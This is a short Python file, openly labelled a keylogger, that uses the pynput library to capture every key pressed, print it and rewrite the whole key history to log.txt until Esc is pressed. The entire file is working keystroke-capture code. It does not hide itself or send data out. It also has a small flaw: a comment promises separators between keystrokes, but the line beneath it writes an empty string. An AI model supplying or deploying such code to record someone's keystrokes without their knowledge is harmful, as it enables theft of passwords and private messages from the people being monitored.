# keylogger using pynput module
import pynput
from pynput.keyboard import Key, Listener # Lstener is a handler
keys = []


def on_press(key):
    keys.append(key)
    write_files(keys)

    try:
        print('ALPHANUMERIC KEY {0} PRESSED'.format(key.char))
    except AttributeError:
        print('SPECIAL KEY {0} PRESSED'.format(key))


def write_files(keys):
    with open('log.txt','w') as f:
        for key in keys:
            # REMOVING ''
            k = str(key).replace("'", "")
            f.write(k)

            # EVERY KEYSTROKE FOR READABILITY
            f.write('')


def on_release(key):
    print('{0} RELEASED'.format(key))
    if key == Key.esc:
        # STOP LISTENER
        return False


with Listener(on_press=on_press, on_release=on_release) as Listener:

    Listener.join()

